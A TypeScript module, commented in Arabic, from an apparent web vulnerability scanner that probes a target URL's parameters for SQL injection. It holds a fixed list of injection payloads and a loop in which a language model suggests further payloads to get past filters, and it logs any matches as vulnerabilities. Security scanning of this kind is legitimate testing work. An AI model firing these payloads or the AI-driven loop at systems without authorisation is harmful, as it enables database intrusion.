import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import { URL } from 'url';
// استيراد الدوال الجديدة من خدمة AI المحدثة
import { getNextSqlPayload, startSqliExploitationChat } from '../../services/ai'; 
import { ALL_SQL_ERROR_SIGNATURES } from './signatures';
import { executeRequest, delay, COMMON_FALLBACK_PARAMS, recordVulnerability } from './common';

// ============================================================================
// ⚙️ CONFIGURATION & CONSTANTS
// ============================================================================

const MAX_AI_ATTEMPTS = 5; // حد أقصى لمحاولات الذكاء الاصطناعي لكل بارامتر

// قائمة "الصاعقة" (Blitzkrieg Payloads)
// هذه حمولات عالية الكفاءة وسريعة جداً لاكتشاف الأخطاء الشائعة دون الحاجة لذكاء اصطناعي
const INTELLIGENCE_PROBE_PAYLOADS = [
    "'", '"', "`", "\\", "1'", "1\"", "1'\"", 
    "1' OR '1'='1", "1' AND 1=1", "1' OR 1=1--", 
    "1' UNION SELECT NULL--", "1' UNION SELECT 1,2,3--", 
    "1' AND 1=CAST(1 AS int)--"
];

// ============================================================================
// 🛡️ MAIN ATTACK LOGIC
// ============================================================================

export async function executeInBandAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 1] 🚀 Starting In-Band Attack (Hybrid AI-Driven)...');
    
    let foundVulnerability = false;
    let baselineLength = 0;

    // 1. تحديد خط الأساس (Baseline) للمقارنة
    try {
        const res = await executeRequest(targetUrl);
        baselineLength = res.responseLength;
    } catch (e) { 
        // نتجاهل أخطاء الشبكة في البداية، سنعتمد على القيم الافتراضية
    }

    // 2. بدء الفحص لكل بارامتر
    for (const param of COMMON_FALLBACK_PARAMS) {
        console.log(`\n[Vector 1] 🎯 Testing Parameter: [${param}]`);

        // --- Phase 1: The Blitzkrieg (Fast Static Scan) ---
        // الفحص السريع: نوفر وقت الـ AI وتكلفته إذا كانت الثغرة سهلة ومكشوفة
        const blitzResult = await runBlitzkriegScan(targetUrl, param, scanId, prisma);
        if (blitzResult) {
            foundVulnerability = true;
            // إذا وجدنا ثغرة بالهجوم السريع، لا داعي لإزعاج الـ AI لهذا البارامتر
            continue; 
        }

        // --- Phase 2: The Grandmaster (AI Autonomous Scan) ---
        // إذا فشل الفحص السريع، نصعد الأمر للذكاء الاصطناعي
        console.log(`[Vector 1] 🧠 Escalating to AI for parameter '${param}'...`);
        
        const aiResult = await runAiScan(targetUrl, param, baselineLength, scanId, prisma);
        if (aiResult) {
            foundVulnerability = true;
        }
    }

    return foundVulnerability;
}

// ============================================================================
// ⚡ HELPER FUNCTIONS (Separation of Concerns)
// ============================================================================

/**
 * ينفذ الفحص السريع باستخدام قائمة حمولات ثابتة وقوية.
 * @returns true إذا تم العثور على ثغرة
 */
async function runBlitzkriegScan(targetUrl: string, param: string, scanId: string, prisma: PrismaClient): Promise<boolean> {
    for (const payload of INTELLIGENCE_PROBE_PAYLOADS) {
        try {
            const testUrl = new URL(targetUrl);
            testUrl.searchParams.set(param, payload);
            
            // استخدام executeRequest المحسنة (Keep-Alive)
            const { responseBody } = await executeRequest(testUrl.toString());
            
            // التحقق من وجود توقيعات أخطاء SQL في الرد
            const foundSignature = ALL_SQL_ERROR_SIGNATURES.find(sig => 
                responseBody.toLowerCase().includes(sig)
            );

            if (foundSignature) {
                console.log(`[Vector 1] ✅ Blitzkrieg Success: Found signature "${foundSignature}"`);
                
                const proof = `Payload: ${payload}\nSignature: ${foundSignature}\nURL: ${testUrl.toString()}`;
                const description = `Error-Based In-Band SQLi detected in parameter '${param}' via fast-scan.`;
                
                await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
                return true;
            }
        } catch (e) { 
            // نتجاهل الأخطاء هنا لنكمل الفحص بسرعة
        }
    }
    return false;
}

/**
 * يدير جلسة الفحص الذكي باستخدام الـ AI (Stateless Mode).
 * @returns true إذا نجح الـ AI في اختراق الهدف
 */
async function runAiScan(targetUrl: string, param: string, baselineLength: number, scanId: string, prisma: PrismaClient): Promise<boolean> {
    // جلسة وهمية للحفاظ على توافق التايب سكريبت (لان الـ AI أصبح Stateless)
    const mockSession = startSqliExploitationChat();
    
    // الحالة الأولية التي سنرسلها للذكاء الاصطناعي
    let previousResult = `Initial Scan State. Baseline Response Length: ${baselineLength}. Start Phase 1 (Fingerprinting).`;
    let attempt = 0;

    while (attempt < MAX_AI_ATTEMPTS) {
        attempt++;
        
        // 1. طلب الخطوة التالية من AI (نرسل له النتيجة السابقة فقط)
        const aiDecision = await getNextSqlPayload(mockSession, previousResult);
        
        // إذا قرر الـ AI التوقف أو لم يرسل بايلود
        if (aiDecision.finished || !aiDecision.payload) {
            console.log(`[Vector 1] 🛑 AI decided to stop scanning '${param}'.`);
            break;
        }

        const payload = aiDecision.payload;
        console.log(`[Vector 1] 🤖 AI Suggests (Try ${attempt}): ${payload}`);
        console.log(`[Vector 1]    Reasoning: ${aiDecision.reasoning}`);

        // 2. تنفيذ الهجوم
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(param, payload);
        const result = await executeRequest(testUrl.toString());

        // 3. تحليل النتيجة (هل ظهر خطأ؟)
        const errorFound = ALL_SQL_ERROR_SIGNATURES.find(sig => 
            result.responseBody.toLowerCase().includes(sig)
        );

        if (errorFound) {
            console.log(`[Vector 1] ✅ AI Confirmed SQLi! Error: ${errorFound}`);
            
            const proof = `Payload: ${payload}\nAI Reasoning: ${aiDecision.reasoning}\nError Signature: ${errorFound}`;
            const description = `AI-Driven SQLi detected in parameter '${param}'. The AI successfully bypassed filters/logic.`;
            
            await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.CRITICAL, description, proof);
            return true;
        }

        // 4. تجهيز النتيجة للمحاولة القادمة (Stateless Feedback Loop)
        // نخبر الـ AI بما حدث ليفكر في الخطوة التالية
        previousResult = `Payload Tested: "${payload}" | Status Code: ${result.status} | Response Time: ${result.responseTime}ms | Content Length: ${result.responseLength} | Error Detected: ${errorFound || 'None'}`;
        
        // تأخير بسيط جداً لاحترام حدود الـ API (يمكن تقليله لأننا نستخدم Stateless)
        await delay(500); 
    }

    return false;
}